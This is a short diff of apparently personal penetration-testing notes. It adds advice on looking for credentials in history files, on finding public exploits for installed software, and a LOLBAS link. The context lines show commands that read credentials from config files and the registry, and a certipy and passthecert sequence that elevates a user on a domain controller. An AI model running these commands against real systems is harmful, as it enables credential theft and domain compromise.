@@ -84,8 +84,13 @@ type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr
 
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
+ #This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows)
 
 ```
+
+## Vulnerable Software:
+
+Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
 
 
 
@@ -338,4 +343,9 @@ certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"
 #pass the extracted cert to dc for modify user object.
 ./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate
 
+```
+
+Checkout LOLBAS:
+```bash
+https://lolbas-project.github.io/#
 ```
